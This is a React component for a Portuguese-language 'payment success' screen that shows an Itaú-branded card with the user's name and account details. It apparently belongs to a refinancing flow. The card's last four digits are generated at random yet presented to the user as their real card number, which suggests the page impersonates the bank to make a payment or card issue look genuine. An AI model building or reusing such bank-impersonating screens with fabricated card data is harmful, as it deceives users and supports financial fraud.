import CreditCardImage from '../../assets/credit_card-min.webp';
import { useState, useContext, useMemo } from 'react';
// eslint-disable-next-line no-unused-vars
import { motion } from 'framer-motion';
import { ProcessContext } from '../../contexts/ProcessContextDefinition.js';
import '../../styles/refino.css';

const PaymentSuccessStep = ({ onContinuar, userName }) => {
  const { processData } = useContext(ProcessContext);
  const userData = processData?.userData || {};
  const nomeUsuario = userData.nome || `${userData.firstName || ''} ${userData.lastName || ''}`.trim() || userName;
  const tipoConta = userData.tipoConta || 'Conta Salário';

  // Gera final do cartão aleatório (4 dígitos)
  const finalCartao = useMemo(() => {
    return Math.floor(1000 + Math.random() * 9000).toString();
  }, []);

  // Extrair nome abreviado: PrimeiroNome M. S. ÚltimoNome
  const getNomeAbreviado = (nomeCompleto) => {
    if (!nomeCompleto) return 'Conta Salário';
    const partes = nomeCompleto.split(' ').filter(parte => parte.length > 0);
    if (partes.length === 1) {
      return partes[0];
    } else if (partes.length === 2) {
      return `${partes[0]} ${partes[1]}`;
    } else {
      const primeiroNome = partes[0];
      const ultimoNome = partes[partes.length - 1];
      const nomesMeio = partes.slice(1, -1)
        .map(n => n.charAt(0).toUpperCase() + '.')
        .join(' ');
      return `${primeiroNome} ${nomesMeio} ${ultimoNome}`;
    }
  };

  const [loading, setLoading] = useState(false);

  const handleFinalizar = async () => {
    setLoading(true);
    setTimeout(async () => {
      await onContinuar();
      setLoading(false);
    }, 1000);
  };

  return (
    <div className="min-h-screen flex flex-col justify-center items-center px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="pt-10 pb-0">
          {/* Título principal */}
          <h1 className="font-medium text-2xl text-gray-900 mb-2 text-left" style={{ lineHeight: 1.25 }}>
            Tudo certo por aqui!<br />
            <p className="koap text-gray-700 mt-4 text-base font-normal">
              Seu cartão chegará para você no endereço fornecido pela empresa.
            </p>
          </h1>

          {/* Cartão Itaú vertical - imagem real, responsiva, nome sobreposto */}
          <div className="flex justify-center my-8 relative" style={{ width: '100%', maxWidth: '400px', margin: '0 auto' }}>
            <img
              src={CreditCardImage}
              alt="Cartão Itaú"
              className="rounded-2xl shadow-lg object-cover w-full"
              style={{ height: 'auto', minHeight: '320px', maxHeight: '480px' }}
            />
            {/* Nome do usuário sobreposto */}
            <span
              className="absolute"
              style={{
                top: '65%',
                left: '8%',
                color: 'white',
                fontFamily: 'BRHendrix-regular, sans-serif',
                fontSize: '1.15rem',
                textShadow: '0 2px 8px rgba(0,0,0,0.25)',
                letterSpacing: '1px',
                maxWidth: '84%',
                textAlign: 'left',
                overflowWrap: 'break-word',
                wordBreak: 'break-word',
                whiteSpace: 'normal',
                marginLeft: 47
              }}
            >
              {
                getNomeAbreviado(nomeUsuario)
              }
            </span>
          </div>

          {/* Dados do cartão em cards */}
          <div className="flex flex-col gap-3 my-5">
            <div className="flex items-center justify-between bg-white rounded-xl border border-gray-200 px-4 py-3 shadow-sm">
              <span className="font-hendrix-semibold text-gray-700 text-sm">Titular da conta</span>
              <span className="font-hendrix-regular text-gray-900 text-sm">{nomeUsuario}</span>
            </div>
            <div className="flex items-center justify-between bg-white rounded-xl border border-gray-200 px-4 py-3 shadow-sm">
              <span className="font-hendrix-semibold text-gray-700 text-sm">Tipo de conta</span>
              <span className="font-hendrix-regular text-gray-900 text-sm">{tipoConta}</span>
            </div>
            <div className="flex items-center justify-between bg-white rounded-xl border border-gray-200 px-4 py-3 shadow-sm">
              <span className="font-hendrix-semibold text-gray-700 text-sm">Cartão final</span>
              <span className="font-hendrix-regular text-gray-900 text-sm">{finalCartao}</span>
            </div>
          </div>

          {/* Botão Finalizar */}
          <motion.button
            type="button"
            onClick={handleFinalizar}
            disabled={loading}
            whileTap={{ scale: 0.97 }}
            whileHover={{ scale: loading ? 1 : 1.03 }}
            className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-orange-400 transition-all duration-300 bg-orange-500 hover:bg-orange-600 mb-2 ${loading ? 'cursor-not-allowed' : ''}`}
            style={{
              fontSize: '15pt',
              boxShadow: '0 2px 8px 0 rgba(255,140,0,0.10)',
              border: 'none',
              opacity: loading ? 0.7 : 1
            }}
          >
            {loading ? (
              <>
                <motion.div
                  className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                  style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                />
                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
              </>
            ) : (
              <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15pt' }}>Finalizar</span>
            )}
          </motion.button>
        </div>
      </div>
    </div>
  );
};

export default PaymentSuccessStep;
